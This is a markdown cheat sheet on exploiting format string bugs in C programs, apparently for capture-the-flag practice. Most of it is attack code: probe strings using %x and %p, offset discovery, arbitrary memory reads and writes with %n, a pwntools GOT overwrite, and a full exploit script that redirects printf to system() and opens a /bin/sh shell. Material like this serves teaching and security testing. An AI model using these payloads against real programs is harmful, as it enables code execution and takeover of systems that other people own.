# Format String Vulnerabilities

## Detection
```c
printf(user_input);           // VULNERABLE - user controls format string
printf("%s", user_input);     // SAFE
fprintf(stderr, user_input);  // VULNERABLE
syslog(LOG_INFO, user_input); // VULNERABLE
```

## Basic Testing
```
Input: %x.%x.%x.%x.%x.%x.%x.%x
If output shows hex values (stack data), format string bug confirmed.

Input: %p.%p.%p.%p
Input: AAAA%p.%p.%p.%p    # Look for 41414141 in output to find offset
```

## Finding the Offset
```python
from pwn import *
p = process('./binary')
p.sendline(b'AAAA' + b'.%p' * 20)
output = p.recvline()
# Find which %p position shows 0x41414141
```

## Reading Memory (Arbitrary Read)
```
%7$s        # Read string at address in 7th stack position
AAAA%7$p    # Leak pointer at position 7 (find offset first)
```

### Leak Specific Address
```python
# Place target address on stack via padding, then reference by position
payload = p64(target_addr) + b'%7$s'  # if target_addr lands at position 7
```

## Writing Memory (Arbitrary Write) - %n specifiers
```
%n          # Writes number of bytes written so far to address (int)
%hn         # Writes as short (2 bytes)
%hhn        # Writes as byte (1 byte)
```

### Basic Write Primitive
```python
from pwn import *

target_addr = 0x0804a020   # e.g., GOT entry
value_to_write = 0xdeadbeef

# Write byte by byte (%hhn) to control exact value at each byte
payload = fmtstr_payload(offset, {target_addr: value_to_write})
```

## pwntools fmtstr_payload (Automated)
```python
from pwn import *

# offset = position where our input starts on stack (determined via %p testing)
payload = fmtstr_payload(offset, {elf.got['printf']: elf.symbols['system']})
p.sendline(payload)
```

## GOT Overwrite Strategy
```python
# Overwrite GOT entry of a function (e.g., printf, exit) to point to system() or win()
from pwn import *

elf = ELF('./binary')
offset = 6  # determined via testing

payload = fmtstr_payload(offset, {elf.got['exit']: elf.symbols['win']})
p.sendline(payload)
```

## Common Pitfalls
```
- %n specifiers are often disabled by default on modern glibc with FORTIFY_SOURCE
- Writing large values requires multiple %n writes with intermediate padding (slow but works)
- Stack alignment/padding may shift position numbers - always verify with %p first
```

## Full Exploit Pattern
```python
from pwn import *

elf = ELF('./binary')
p = process('./binary')

# Step 1: confirm vuln
p.sendline(b'%x.%x.%x.%x')
print(p.recvline())

# Step 2: find offset
p.sendline(b'AAAA' + b'.%p' * 10)
# manually inspect output for 0x41414141

# Step 3: build write payload
offset = 6
payload = fmtstr_payload(offset, {elf.got['printf']: elf.symbols['system']})
p.sendline(payload)

# Step 4: trigger overwritten function
p.sendline(b'/bin/sh')
p.interactive()
```
